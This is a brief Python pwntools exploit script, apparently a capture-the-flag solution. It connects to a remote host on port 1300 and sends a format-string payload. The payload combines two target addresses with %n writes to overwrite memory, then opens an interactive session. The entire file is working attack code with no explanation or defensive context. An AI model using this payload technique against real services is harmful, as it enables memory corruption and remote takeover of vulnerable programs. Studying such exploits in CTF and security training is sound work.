from pwn import *

#p=process("./task")
p=remote("54.208.125.237",1300)

print p.recvline()

payload=""
payload+="BB"
payload+=p32(0x804a030)
payload+=p32(0x804a032)
payload+="%7$47796x"
payload+="%7$n"
payload+="%8$1600x"
payload+="%8$n"
pause()
p.sendline(payload)
p.interactive()









